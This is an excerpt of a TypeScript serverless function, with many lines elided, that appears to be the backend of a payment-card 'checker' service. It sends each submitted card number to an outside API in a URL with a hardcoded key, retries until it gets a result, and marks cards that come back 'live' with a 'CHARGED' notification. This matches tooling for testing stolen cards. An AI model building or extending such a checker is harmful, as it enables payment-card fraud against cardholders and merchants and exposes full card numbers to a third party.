...
const notifyChargedCard = (
  ...
  }).catch((err) => console.error("[APP-AUTH] notify-charged-card error:", err));
};
...
const performCheck = async (cc: string, attempt: number = 1): Promise<Record<string, unknown>> => {
  const maxRetries = 5;
  const apiUrl = `https://onyxenvbot.up.railway.app/app-auth/key=yashikaaa/cc=${cc}`;

  console.log(`[APP-AUTH] Attempt ${attempt}/${maxRetries} - Calling API`);
  ...
  try {
    ...
    console.log(`[APP-AUTH] Attempt ${attempt} - Raw response:`, rawText);
    ...
    if (computedStatus === "unknown" && attempt < maxRetries) {
      console.log(`[APP-AUTH] UNKNOWN on attempt ${attempt}, retrying...`);
    ...
    console.error(`[APP-AUTH] Attempt ${attempt} error:`, error);
...
serve(async (req) => {
  ...
  try {
    ...
    console.log('[APP-AUTH] Checking card for user:', user.id);

    const data = await performCheck(cc);

    if (data.computedStatus === 'live') {
      notifyChargedCard(user.id, cc, 'CHARGED', String(data.apiMessage || 'LIVE'), '$0.00', 'App Based');
    }
